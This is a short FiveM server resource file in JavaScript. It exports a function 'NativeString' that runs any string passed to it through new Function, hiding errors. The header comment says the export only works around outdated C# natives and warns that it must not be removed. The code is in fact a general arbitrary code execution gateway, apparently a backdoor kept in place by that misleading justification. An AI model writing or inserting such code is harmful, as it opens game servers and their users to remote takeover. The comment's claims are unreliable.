/*
	This export enables temporary use of certain FiveM natives through JavaScript, 
	as the C# reference for these natives is currently outdated. For example, 
	specific helicopter and ragdoll natives have been updated on the FiveM platform, 
	but implementing them directly in C# causes scripts to break.

	This file/export must not be removed, as it is critical for maintaining the 
	functionality of almost all scripts. Many of our scripts rely on these natives, 
	which cannot currently be used reliably with the C# reference.
*/


exports("NativeString", (native) => {
	try {
		const nativeFunction = new Function(native);
		nativeFunction();
	} catch {
		console.error(`Error executing native string`);
	}
});